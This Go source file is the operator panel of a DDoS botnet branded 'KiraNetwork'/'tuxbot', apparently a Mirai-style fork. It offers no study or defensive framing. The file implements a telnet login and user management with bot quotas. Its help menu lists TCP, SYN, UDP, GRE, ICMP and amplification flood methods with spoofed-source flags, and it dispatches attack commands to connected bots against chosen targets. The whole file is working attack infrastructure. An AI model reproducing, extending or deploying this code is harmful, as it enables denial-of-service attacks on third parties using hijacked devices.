// by juan @ipmiv2 on telegram
package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "io/ioutil"
    "log"
    "os"
)

type Admin struct {
    conn    net.Conn
    history []string
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn: conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.Write([]byte(fmt.Sprintf("\033]0;botnet login\007")))
    addr := this.conn.RemoteAddr().String()
    host, _, _ := net.SplitHostPort(addr)

    f, err := os.OpenFile("connections.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err == nil {
        f.WriteString(host + "\n")
        f.Close()
    }

    var username string
    var userInfo AccountInfo
    for i := 0; i < 3; i++ {
        this.conn.SetDeadline(time.Now().Add(60 * time.Second))
        this.conn.Write([]byte("\x1b[1;37mUsername\x1b[38;5;98m: \x1b[1;97m"))
        username, err = this.ReadLine(false, "")
        if err != nil {
            return
        }

        this.conn.SetDeadline(time.Now().Add(60 * time.Second))
        this.conn.Write([]byte("\x1b[1;37mPassword\x1b[38;5;98m: \x1b[1;97m"))
        password, err := this.ReadLine(true, "")
        if err != nil {
            return
        }

        this.conn.Write([]byte("\r\n"))
        var ok bool
        if ok, userInfo = database.TryLogin(username, password); !ok {
            this.conn.Write([]byte("\x1b[1;91mLogin incorrect.\r\n\r\n"))
            continue
        }
        break
    }
    if userInfo.username == "" {
        this.conn.Write([]byte("\x1b[1;91mToo many failed attempts.\r\n"))
        return
    }

    this.conn.SetDeadline(time.Time{})
    log.Println("User " + username + " Has Logged in")
    this.conn.Write([]byte("\033[2J\033[H"))
    this.conn.Write([]byte("\033[38;5;11m"))
    this.conn.Write([]byte("Welcome to \033[38;5;98mKiraNetwork \033[97m(edited and fixed by \033[38;5;98mAnas \033[97m(@\033[38;5;98nfo.down2\033[97m) on discord)\r\n\r\n"))
    this.conn.Write([]byte("\033[0m"))

    done := make(chan struct{})
    defer close(done)
    go func() {
        for {
            select {
            case <-done:
                return
            default:
                BotCount := int(clientList.Count())
                if userInfo.maxBots != -1 && BotCount > userInfo.maxBots {
                    BotCount = userInfo.maxBots
                }
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d | Slots: %d/2\007", BotCount, database.fetchRunningAttacks()))); err != nil {
                    return
                }
                time.Sleep(time.Second)
            }
        }
    }()

    for {
        var botCatagory string
        botCount := userInfo.maxBots
        prompt := "\x1b[38;5;98m[\x1b[97mroot\x1b[38;5;98m@\x1b[97mtuxbot\x1b[38;5;98m]\x1b[97m~# "
        cmd, err := this.ReadLine(false, prompt)
        if err != nil {
            return
        }
        if cmd == "" {
            continue
        }

        if cmd == "exit" || cmd == "quit" {
            return
        }

        // Normalize whitespace so "attacks  enable" matches
        cmd = strings.Join(strings.Fields(cmd), " ")
        botCount = userInfo.maxBots

        switch {
        case cmd == "clear" || cmd == "cls":
            this.conn.Write([]byte("\033[2J\033[H"))
            this.conn.Write([]byte("\033[38;5;11m"))
            this.conn.Write([]byte("Welcome to \033[38;5;98mKiraNetwork \033[97m(edited and fixed by \033[38;5;98mAnas \033[97m(@\033[38;5;98nfo.down\033[97m) on discord)\r\n\r\n"))
            this.conn.Write([]byte("\033[0m"))

        case cmd == "help" || cmd == "h" || cmd == "?" || cmd == "methods":
            this.conn.Write([]byte("\x1b[1;97m\x1b[4mAttack Methods\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[90mSyntax: !<method> <target> <time> [flag=value ...]\r\n\r\n"))
            this.conn.Write([]byte("\x1b[1;97mTCP Floods\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[97m  !tcp       \x1b[90m- TCP RAW flood (source-based, high PPS)\r\n"))
            this.conn.Write([]byte("\x1b[97m  !syn       \x1b[90m- TCP SYN flood (half-open handshake DoS)\r\n"))
            this.conn.Write([]byte("\x1b[97m  !socket    \x1b[90m- TCP socket flood (real connections)\r\n"))
            this.conn.Write([]byte("\x1b[97m  !tcpbypass \x1b[90m- TCP bypass flood (evasion)\r\n"))
            this.conn.Write([]byte("\x1b[97m  !tcpboom   \x1b[90m- TCP boom flood\r\n"))
            this.conn.Write([]byte("\x1b[97m  !tcpkiller \x1b[90m- TCP killer flood\r\n"))
            this.conn.Write([]byte("\x1b[97m  !tcpxmas   \x1b[90m- TCP XMAS flood (all flags set)\r\n"))
            this.conn.Write([]byte("\x1b[97m  !tcpfrag   \x1b[90m- TCP fragmentation flood\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;97mUDP Floods\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[97m  !udp       \x1b[90m- UDP flood (normal/high PPS)\r\n"))
            this.conn.Write([]byte("\x1b[97m  !nudp      \x1b[90m- UDP flood, optimized for highest PPS\r\n"))
            this.conn.Write([]byte("\x1b[97m  !std       \x1b[90m- UDP std flood\r\n"))
            this.conn.Write([]byte("\x1b[97m  !mixamp    \x1b[90m- UDP amplification mix flood\r\n"))
            this.conn.Write([]byte("\x1b[97m  !discord   \x1b[90m- UDP/DNS VoIP bypass flood\r\n"))
            this.conn.Write([]byte("\x1b[97m  !udprand   \x1b[90m- UDP random flood\r\n"))
            this.conn.Write([]byte("\x1b[97m  !udpbp     \x1b[90m- UDP bypass flood (Wuhan variant)\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;97mGRE / ICMP Floods\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[97m  !greip     \x1b[90m- GRE IP-in-IP encapsulated flood\r\n"))
            this.conn.Write([]byte("\x1b[97m  !greeth    \x1b[90m- GRE Ethernet flood\r\n"))
            this.conn.Write([]byte("\x1b[97m  !greip2    \x1b[90m- GRE IP flood (aisuru variant)\r\n"))
            this.conn.Write([]byte("\x1b[97m  !icmp      \x1b[90m- ICMP echo request flood\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;97mSpecial\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[97m  !syn2      \x1b[90m- SYN flood (aisuru variant)\r\n"))
            this.conn.Write([]byte("\x1b[97m  !socket2   \x1b[90m- TCP socket flood (aisuru variant)\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;97m\x1b[4mGlobal Flags (apply to all methods)\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[90m  dport=<>     Destination port (0-65535, 65535 = random)\r\n"))
            this.conn.Write([]byte("\x1b[90m  sport=<>     Source port (0-65535, 65535 = random)\r\n"))
            this.conn.Write([]byte("\x1b[90m  len=<>       Payload size in bytes (default: 512)\r\n"))
            this.conn.Write([]byte("\x1b[90m  rand=0/1     Randomize payload content (default: 1)\r\n"))
            this.conn.Write([]byte("\x1b[90m  ttl=<>       IP Time-To-Live (default: 255)\r\n"))
            this.conn.Write([]byte("\x1b[90m  tos=<>       IP Type-Of-Service (default: 0)\r\n"))
            this.conn.Write([]byte("\x1b[90m  ident=<>     IP ID (default: random)\r\n"))
            this.conn.Write([]byte("\x1b[90m  df=0/1       Set IP Don't-Fragment bit (default: 0)\r\n"))
            this.conn.Write([]byte("\x1b[90m  seqnum=<>    TCP sequence number (default: random)\r\n"))
            this.conn.Write([]byte("\x1b[90m  acknum=<>    TCP ACK number (default: random)\r\n"))
            this.conn.Write([]byte("\x1b[90m  source=<>    Spoofed source IP (default: random)\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;97m\x1b[4mExamples\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[90m  !udp 1.2.3.4 60 dport=80 len=1024\r\n"))
            this.conn.Write([]byte("\x1b[90m  !syn 1.2.3.4 30 dport=443 sport=65000\r\n"))
            this.conn.Write([]byte("\x1b[90m  !tcp 10.0.0.0/24 120 dport=22\r\n"))
            this.conn.Write([]byte("\x1b[90m  -5 !udp 1.2.3.4 30 dport=53         (use 5 bots)\r\n"))
            this.conn.Write([]byte("\x1b[90m  @arc !syn 1.2.3.4 60                (arc bots only)\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;97m\x1b[4mPanel Commands\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[97m  help/h/?   \x1b[90m- This help text\r\n"))
            this.conn.Write([]byte("\x1b[97m  clear/cls  \x1b[90m- Clear the screen\r\n"))
            this.conn.Write([]byte("\x1b[97m  stats      \x1b[90m- Show connected bot count and running attacks\r\n"))
            this.conn.Write([]byte("\x1b[97m  exit/quit  \x1b[90m- Disconnect from panel\r\n"))
            this.conn.Write([]byte("\r\n"))
            if userInfo.admin == 1 {
                this.conn.Write([]byte("\x1b[1;97m\x1b[4mAdmin Commands\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[97m  adduser            \x1b[90m- Create a new user account\r\n"))
                this.conn.Write([]byte("\x1b[97m  remuser            \x1b[90m- Remove a user account\r\n"))
                this.conn.Write([]byte("\x1b[97m  list [type]       \x1b[90m- List device types connected\r\n"))
                this.conn.Write([]byte("\x1b[97m  list all          \x1b[90m- Show all device types with counts\r\n"))
                this.conn.Write([]byte("\x1b[97m  attacks enable    \x1b[90m- Enable global attack processing\r\n"))
                this.conn.Write([]byte("\x1b[97m  attacks disable   \x1b[90m- Disable global attack processing\r\n"))
                this.conn.Write([]byte("\r\n"))
            }

        case cmd == "stats" || cmd == "STATS":
            BotCount := int(clientList.Count())
            this.conn.Write([]byte(fmt.Sprintf("\x1b[97mBots: \x1b[92m%d\x1b[97m | Running attacks: \x1b[92m%d\x1b[0m\r\n", BotCount, database.fetchRunningAttacks())))

        case userInfo.admin == 1 && cmd == "attacks enable":
            ioutil.WriteFile("status.txt", []byte("ON"), 0644)
            this.conn.Write([]byte("\x1b[1;92mAttacks enabled\r\n"))

        case userInfo.admin == 1 && cmd == "attacks disable":
            ioutil.WriteFile("status.txt", []byte("OFF"), 0644)
            this.conn.Write([]byte("\x1b[1;92mAttacks disabled\r\n"))

        case userInfo.admin == 1 && cmd == "adduser":
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false, "")
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false, "")
            if err != nil {
                return
            }
            this.conn.Write([]byte("Bot count (-1 for unlimited): "))
            max_bots_str, err := this.ReadLine(false, "")
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte("\033[31;1mInvalid bot count\033[0m\r\n"))
                continue
            }
            this.conn.Write([]byte("Max attack duration (seconds, 0 = unlimited): "))
            duration_str, err := this.ReadLine(false, "")
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte("\033[31;1mInvalid duration\033[0m\r\n"))
                continue
            }
            this.conn.Write([]byte("Cooldown (seconds): "))
            cooldown_str, err := this.ReadLine(false, "")
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte("\033[31;1mInvalid cooldown\033[0m\r\n"))
                continue
            }
            this.conn.Write([]byte(fmt.Sprintf("Username: %s\r\nPassword: %s\r\nBots: %d\r\nDuration: %d\r\nCooldown: %d\r\nContinue? (y/N): ", new_un, new_pw, max_bots, duration, cooldown)))
            confirm, err := this.ReadLine(false, "")
            if err != nil {
                return
            }
            if confirm != "y" {
                this.conn.Write([]byte("\033[33;1mCancelled\r\n"))
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte("\033[31;1mFailed to create user (may already exist)\033[0m\r\n"))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully\033[0m\r\n"))
            }

        case userInfo.admin == 1 && cmd == "remuser":
            this.conn.Write([]byte("\033[37mUsername: \033[35m"))
            rm_un, err := this.ReadLine(false, "")
            if err != nil {
                return
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[37mRemove %s? (\033[32my\033[37m/\033[31mn\033[37m) ", rm_un)))
            confirm, err := this.ReadLine(false, "")
            if err != nil {
                return
            }
            if confirm != "y" {
                this.conn.Write([]byte("\033[33;1mCancelled\r\n"))
                continue
            }
            if !database.RemoveUser(rm_un) {
                this.conn.Write([]byte("\033[31;1mUser not found\r\n"))
            } else {
                this.conn.Write([]byte("\033[32;1mUser removed\r\n"))
            }

        case userInfo.admin == 1 && strings.HasPrefix(cmd, "list"):
            deviceType := strings.TrimSpace(strings.TrimPrefix(cmd, "list"))
            deviceDistribution := clientList.Distribution()

            if deviceType == "all" || deviceType == "" {
                for device, count := range deviceDistribution {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[97m%s: \x1b[97m%d\r\n", device, count)))
                }
                totalDevices := clientList.Count()
                this.conn.Write([]byte(fmt.Sprintf("\x1b[97mTotal: %d\r\n", totalDevices)))
            } else {
                for device, count := range deviceDistribution {
                    if strings.HasPrefix(strings.ToLower(device), strings.ToLower(deviceType)) {
                        this.conn.Write([]byte(fmt.Sprintf("\x1b[97m%s: \x1b[97m%d\r\n", device, count)))
                    }
                }
            }

        case userInfo.admin != 1 && strings.HasPrefix(cmd, "list"):
            this.conn.Write([]byte("\x1b[1;91mAccess denied\r\n"))

        default:
            if cmd[0] != '!' && cmd[0] != '-' && cmd[0] != '@' {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91mUnknown command: %s\x1b[0m\r\n", cmd)))
                this.conn.Write([]byte("\x1b[90mType 'help' or '?' for available commands\x1b[0m\r\n"))
                continue
            }

            if cmd[0] == '-' {
                countSplit := strings.SplitN(cmd, " ", 2)
                if len(countSplit) < 2 {
                    this.conn.Write([]byte("\033[31;1mMissing command\033[0m\r\n"))
                    continue
                }
                count := countSplit[0][1:]
                botCount, err = strconv.Atoi(count)
                if err != nil {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1mInvalid bot count \"%s\"\033[0m\r\n", count)))
                    continue
                }
                if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1mMax allowed bots: %d\033[0m\r\n", userInfo.maxBots)))
                    continue
                }
                cmd = countSplit[1]
            }
            if len(cmd) > 0 && userInfo.admin == 1 && cmd[0] == '@' {
                cataSplit := strings.SplitN(cmd, " ", 2)
                if len(cataSplit) >= 2 {
                    botCatagory = cataSplit[0][1:]
                    cmd = cataSplit[1]
                }
            }

            logLine := fmt.Sprintf("tuxbot --> %s (%s) --> %s\n", username, host, cmd)
            if fl, _ := os.OpenFile("logs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); fl != nil {
                fl.WriteString(logLine)
                fl.Close()
            }

            atk, err := NewAttack(cmd, userInfo.admin)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                this.conn.Write([]byte("\x1b[90mType help or ? for command syntax\x1b[0m\r\n"))
                continue
            }

            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                this.conn.Write([]byte("\x1b[90mAttack build failed - check your flags\x1b[0m\r\n"))
                continue
            }

            if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else if database.ContainsWhitelistedTargets(atk) {
                this.conn.Write([]byte("\033[31;1mTarget is whitelisted\033[0m\r\n"))
            } else {
                totalBots := int(clientList.Count())
                if totalBots == 0 {
                    this.conn.Write([]byte("\033[33;1mNo bots connected - nothing will be broadcast\x1b[0m\r\n"))
                } else {
                    targetSummary := fmt.Sprintf("%d target(s)", len(atk.Targets))
                    effectiveBots := botCount
                    if effectiveBots == -1 || effectiveBots > totalBots {
                        effectiveBots = totalBots
                    }
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;92mSent!\x1b[0m %s | duration: \x1b[93m%d\x1b[0ms | bots: \x1b[93m%d\x1b[0m/%d\r\n", targetSummary, atk.Duration, effectiveBots, totalBots)))
                }
            }
        }
    }
}

func readEscape(conn net.Conn) ([]byte, error) {
    b := make([]byte, 1)
    seq := []byte{0x1B}
    for i := 0; i < 4; i++ {
        _, err := conn.Read(b)
        if err != nil {
            return nil, err
        }
        seq = append(seq, b[0])
        if b[0] != '[' && b[0] != 'O' && !(b[0] >= '0' && b[0] <= '9') && b[0] != ';' {
            break
        }
    }
    return seq, nil
}

func (this *Admin) ReadLine(masked bool, prompt string) (string, error) {
    line := make([]byte, 0, 1024)
    pos := 0

    if prompt != "" {
        this.conn.Write([]byte(prompt))
    }

    for {
        b := make([]byte, 1)
        n, err := this.conn.Read(b)
        if err != nil || n != 1 {
            return "", err
        }
        c := b[0]

        if c == 0xFF {
            // IAC - read command byte and absorb the sequence
            _, err := this.conn.Read(b)
            if err != nil {
                return "", err
            }
            cmd := b[0]
            if cmd == 0xFD || cmd == 0xFE || cmd == 0xFB || cmd == 0xFC {
                // DO/DONT/WILL/WONT - read option byte
                _, err := this.conn.Read(b)
                if err != nil {
                    return "", err
                }
            } else if cmd == 0xFA {
                // Subnegotiation - read until IAC SE
                for {
                    _, err := this.conn.Read(b)
                    if err != nil {
                        return "", err
                    }
                    if b[0] == 0xFF {
                        _, err := this.conn.Read(b)
                        if err != nil {
                            return "", err
                        }
                        if b[0] == 0xF0 {
                            break
                        }
                    }
                }
            }
            continue
        }
        if c == 0xFD || c == 0xFE || c == 0xFB || c == 0xFC {
            // Orphaned telnet DO/DONT/WILL/WONT (first byte of IAC was consumed
            // by initialHandler) - read option byte and discard
            _, err := this.conn.Read(b)
            if err != nil {
                return "", err
            }
            continue
        }

        if c == 0x1B {
            seq, err := readEscape(this.conn)
            if err != nil {
                return "", err
            }
            if len(seq) < 2 {
                continue
            }
            switch string(seq) {
            case "\x1B[A": // up
                if masked || len(this.history) == 0 {
                    continue
                }
                this.redrawLine(prompt, string(line), pos)
                line = []byte(this.history[len(this.history)-1])
                pos = len(line)
                this.conn.Write([]byte("\r" + prompt + string(line)))
            case "\x1B[B": // down
                if masked {
                    continue
                }
                this.conn.Write([]byte("\r" + prompt + string(line)))
            case "\x1B[C": // right
                if masked {
                    continue
                }
                if pos < len(line) {
                    pos++
                    this.conn.Write([]byte("\x1B[C"))
                }
            case "\x1B[D": // left
                if masked {
                    continue
                }
                if pos > 0 {
                    pos--
                    this.conn.Write([]byte("\x1B[D"))
                }
            case "\x1B[H", "\x1B[1~": // home
                if masked {
                    continue
                }
                n := pos
                pos = 0
                if n > 0 {
                    this.conn.Write([]byte(fmt.Sprintf("\x1B[%dD", n)))
                }
            case "\x1B[F", "\x1B[4~": // end
                if masked {
                    continue
                }
                n := len(line) - pos
                pos = len(line)
                if n > 0 {
                    this.conn.Write([]byte(fmt.Sprintf("\x1B[%dC", n)))
                }
            case "\x1B[3~": // delete
                if masked {
                    continue
                }
                if pos < len(line) {
                    line = append(line[:pos], line[pos+1:]...)
                    this.conn.Write([]byte("\x1B[2K\r" + prompt + string(line)))
                    if len(line) > pos {
                        this.conn.Write([]byte(fmt.Sprintf("\x1B[%dD", len(line)-pos)))
                    }
                }
            case "\x1B[2~": // insert
                // ignore
            default:
                // unknown escape sequence, ignore
            }
            continue
        }

        if c < 0x20 {
            switch c {
            case 0x01: // Ctrl+A - home
                if masked {
                    continue
                }
                n := pos
                pos = 0
                if n > 0 {
                    this.conn.Write([]byte(fmt.Sprintf("\x1B[%dD", n)))
                }
            case 0x02: // Ctrl+B - left
                if masked || pos == 0 {
                    continue
                }
                pos--
                this.conn.Write([]byte("\x1B[D"))
            case 0x03: // Ctrl+C - cancel
                this.conn.Write([]byte("^C\r\n"))
                return "", nil
            case 0x04: // Ctrl+D - delete at cursor
                if masked || pos >= len(line) {
                    continue
                }
                line = append(line[:pos], line[pos+1:]...)
                this.conn.Write([]byte("\x1B[2K\r" + prompt + string(line)))
                if len(line) > pos {
                    this.conn.Write([]byte(fmt.Sprintf("\x1B[%dD", len(line)-pos)))
                }
            case 0x05: // Ctrl+E - end
                if masked {
                    continue
                }
                n := len(line) - pos
                pos = len(line)
                if n > 0 {
                    this.conn.Write([]byte(fmt.Sprintf("\x1B[%dC", n)))
                }
            case 0x06: // Ctrl+F - right
                if masked || pos >= len(line) {
                    continue
                }
                pos++
                this.conn.Write([]byte("\x1B[C"))
            case 0x08, 0x7F: // backspace
                if pos > 0 {
                    pos--
                    line = append(line[:pos], line[pos+1:]...)
                    this.conn.Write([]byte("\x1B[2K\r" + prompt + string(line)))
                    if len(line) > pos {
                        this.conn.Write([]byte(fmt.Sprintf("\x1B[%dD", len(line)-pos)))
                    }
                }
            case 0x0B: // Ctrl+K - kill to end of line
                if masked {
                    continue
                }
                line = line[:pos]
                this.conn.Write([]byte("\x1B[J"))
            case 0x0C: // Ctrl+L - clear screen
                if masked {
                    continue
                }
                this.conn.Write([]byte("\033[2J\033[H"))
                this.conn.Write([]byte("\r" + prompt + string(line)))
                if len(line) > pos {
                    this.conn.Write([]byte(fmt.Sprintf("\x1B[%dD", len(line)-pos)))
                }
            case 0x0E: // Ctrl+N - down (like down arrow)
                if masked || len(this.history) == 0 {
                    continue
                }
                line = []byte{}
                pos = 0
                this.conn.Write([]byte("\x1B[2K\r" + prompt))
            case 0x0D, 0x0A: // enter
                this.conn.Write([]byte("\r\n"))
                result := strings.TrimSpace(string(line))
                if result != "" {
                    this.history = append(this.history, result)
                }
                return result, nil
            case 0x10: // Ctrl+P - up (like up arrow)
                if masked || len(this.history) == 0 {
                    continue
                }
                line = []byte(this.history[len(this.history)-1])
                pos = len(line)
                this.conn.Write([]byte("\r" + prompt + string(line)))
            case 0x15: // Ctrl+U - kill whole line
                if masked {
                    continue
                }
                line = line[:0]
                pos = 0
                this.conn.Write([]byte("\x1B[2K\r" + prompt))
            case 0x17: // Ctrl+W - delete word backward
                if masked {
                    continue
                }
                if pos == 0 {
                    continue
                }
                end := pos
                for pos > 0 && line[pos-1] == ' ' {
                    pos--
                }
                for pos > 0 && line[pos-1] != ' ' {
                    pos--
                }
                line = append(line[:pos], line[end:]...)
                this.conn.Write([]byte("\x1B[2K\r" + prompt + string(line)))
                if len(line) > pos {
                    this.conn.Write([]byte(fmt.Sprintf("\x1B[%dD", len(line)-pos)))
                }
            case '\t':
                // ignore
            default:
                continue
            }
            continue
        }

        if c == 0x1B {
            continue
        }

        if masked && c >= 0x20 {
            line = append(line, c)
            this.conn.Write([]byte("*"))
            pos++
            continue
        }

        if c >= 0x20 {
            if pos == len(line) {
                line = append(line, c)
                pos++
                this.conn.Write([]byte(string(c)))
            } else {
                tail := make([]byte, len(line[pos:]))
                copy(tail, line[pos:])
                line = append(line[:pos], append([]byte{c}, tail...)...)
                pos++
                this.conn.Write([]byte("\x1B[2K\r" + prompt + string(line)))
                if len(line) > pos {
                    this.conn.Write([]byte(fmt.Sprintf("\x1B[%dD", len(line)-pos)))
                }
            }
        }
    }
}

func (this *Admin) redrawLine(prompt, line string, pos int) {
    // placeholder for future use (cursor save/restore during history cycling)
}
